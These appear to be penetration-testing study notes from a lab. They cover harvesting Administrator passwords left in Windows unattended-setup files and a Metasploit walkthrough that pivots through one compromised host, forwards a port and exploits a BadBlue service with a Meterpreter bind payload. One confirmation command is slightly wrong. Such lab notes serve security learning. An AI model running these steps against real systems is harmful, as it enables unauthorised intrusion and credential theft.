Unattended Windows Setup Utility
---------------------------------

The Unattended Windows Setup Utility, it allows system administrators to automate the installation process of Windows operating systems, including the setup of drivers, applications, and configurations, without requiring manual intervention for each installation

It utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account's password.

If the Unattended Windows Setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows target legitimately.


The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:

C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Autounattend.xml

As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.

Pivoting
-------

Pivoting is a post exploitation technique that involves utilizing the compromised device that is connected to multiple networks to gain access
to systems within other networks. Need to understand port forwarding

victim1: 10.0.31.174
victim2: 10.0.17.153

You already need to have a victim1 session. After that addroute to victim2 by creating a gateway

meterpreter> run addroute -s 10.0.31.0/20
 	   > background

Listen the victim2 port with scanner/portscan/tcp

msf5> search portscan
[+] 10.0.17.153:          - 10.0.17.153:80 - TCP OPEN

Start portfowarding in victim1 session
--------------------------------------
meterpreter > portfwd add -l 1234 -p 80 -r 10.0.17.153

To confirm the port in your host
---------------------------------
#netstat -ant
#nmap -p 1234 -sV 10.0.17.153

Service name badblue

Attack the badblue with bind_tcp and get victim2 access

msf5 exploit(/windows/....) > set payload windows/meterpreter/bind_tcp
			    > set RHOSTS 10.0.17.153
			    > run
